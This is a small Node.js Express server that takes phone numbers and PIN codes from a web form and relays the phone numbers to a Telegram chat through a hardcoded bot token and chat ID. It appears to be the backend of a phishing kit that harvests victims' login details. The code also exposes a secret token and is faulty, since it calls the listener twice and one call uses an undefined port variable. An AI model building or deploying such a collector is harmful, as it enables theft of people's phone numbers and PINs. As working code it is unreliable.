const express = require('express');
const fetch = require('node-fetch');
const app = express();
const port = 8000;

app.use(express.json());
app.use(express.static('public')); // Serve static files

const TELEGRAM_BOT_TOKEN = '7246291582:AAGDVmXvRKX_PdEug_XZ2-pKnXrkPMcS3k0';
const TELEGRAM_CHAT_ID = '-4544953608';

const clientData = {};

// Phone Number Submission
app.post('/api/phone', async (req, res) => {
    try {
        const { phoneNumber } = req.body;

        if (!phoneNumber || clientData[phoneNumber]) {
            return res.status(400).json({ error: 'Phone number invalid or already submitted.' });
        }

        clientData[phoneNumber] = null;
        const message = `New Phone Number Submission:\nPhone Number: ${phoneNumber}`;
        await sendTelegramMessage(message);

        res.status(200).json({ message: 'Phone number received.' });
    } catch (error) {
        console.error(error);
        res.status(500).json({ error: 'Internal Server Error.' });
    }
});

// PIN Code Submission

app.post('/api/pin', (req, res) => {
    const { pinCode } = req.body;
    if (!pinCode) {
        return res.status(400).json({ error: 'Missing PIN code.' });
    }
    res.json({ message: `Received PIN code: ${pinCode}` });
});

app.listen(PORT, () => console.log(`Server running at http://localhost:${PORT}`));

// Send Telegram Message
async function sendTelegramMessage(message) {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    const payload = { chat_id: TELEGRAM_CHAT_ID, text: message };

    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload),
        });

        if (!response.ok) {
            throw new Error(`Failed to send message: ${await response.text()}`);
        }
        console.log('Message sent successfully');
    } catch (error) {
        console.error('Error sending Telegram message:', error);
    }
}

// Start the server
app.listen(port, () => {
    console.log(`Server running at http://localhost:${port}`);
});
